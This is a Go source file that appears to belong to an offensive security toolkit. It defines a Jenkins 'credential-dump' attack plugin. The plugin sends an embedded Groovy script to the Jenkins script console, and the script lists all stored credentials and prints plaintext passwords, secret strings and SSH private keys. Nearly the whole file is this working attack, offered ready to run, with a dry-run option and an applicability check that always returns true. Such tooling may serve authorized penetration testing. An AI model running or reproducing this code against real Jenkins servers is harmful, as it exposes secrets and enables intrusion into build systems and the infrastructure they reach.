package credentialdump

import (
	"context"
	"fmt"
	"time"

	"github.com/praetorian-inc/trajan/internal/registry"
	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/attacks/base"
	"github.com/praetorian-inc/trajan/pkg/detections"
	"github.com/praetorian-inc/trajan/pkg/jenkins"
)

const groovyScript = `
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.plugins.credentials.impl.*
import org.jenkinsci.plugins.plaincredentials.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*

def creds = CredentialsProvider.lookupCredentials(
    Credentials.class,
    Jenkins.instance,
    null,
    null
)

for (c in creds) {
    println("ID: ${c.id}")
    println("Description: ${c.description}")
    println("Type: ${c.class.name}")
    if (c instanceof UsernamePasswordCredentials) {
        println("Username: ${c.username}")
        println("Password: ${c.password}")
    } else if (c instanceof StringCredentials) {
        println("Secret: ${c.secret}")
    } else if (c instanceof BasicSSHUserPrivateKey) {
        println("Username: ${c.username}")
        println("PrivateKey: ${c.privateKeySource.privateKeys[0]}")
    }
    println("---")
}
`

func init() {
	registry.RegisterAttackPlugin("jenkins", "credential-dump", func() attacks.AttackPlugin {
		return New()
	})
}

// Plugin implements credential dumping via Groovy script console.
type Plugin struct {
	base.BaseAttackPlugin
}

// New creates a new credential-dump attack plugin.
func New() *Plugin {
	return &Plugin{
		BaseAttackPlugin: base.NewBaseAttackPlugin(
			"credential-dump",
			"Dump Jenkins credentials via Groovy script console",
			"jenkins",
			attacks.CategorySecrets,
		),
	}
}

// CanAttack checks if credential dump is applicable.
func (p *Plugin) CanAttack(findings []detections.Finding) bool {
	for _, f := range findings {
		if f.Platform == "jenkins" && f.Workflow == "/script" {
			return true
		}
	}
	return true // Also applicable if forced
}

// Execute performs the credential dump attack.
func (p *Plugin) Execute(ctx context.Context, opts attacks.AttackOptions) (*attacks.AttackResult, error) {
	jPlatform, ok := opts.Platform.(*jenkins.Platform)
	if !ok {
		return nil, fmt.Errorf("platform is not Jenkins")
	}
	client := jPlatform.Client()

	result := &attacks.AttackResult{
		Plugin:    p.Name(),
		SessionID: opts.SessionID,
		Timestamp: time.Now(),
	}

	if opts.DryRun {
		result.Success = true
		result.Message = "DRY RUN: Would execute Groovy credential dump script via /scriptText"
		result.Data = map[string]interface{}{
			"script": groovyScript,
			"note":   "Use --confirm to execute",
		}
		return result, nil
	}

	output, err := client.PostScript(ctx, groovyScript)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("Script execution failed: %v", err)
		return result, nil
	}

	result.Success = true
	result.Message = "Credentials dumped successfully"
	result.Data = map[string]interface{}{
		"output": output,
	}
	return result, nil
}

// Cleanup is a no-op for credential dump (read-only operation).
func (p *Plugin) Cleanup(ctx context.Context, session *attacks.Session) error {
	return nil
}
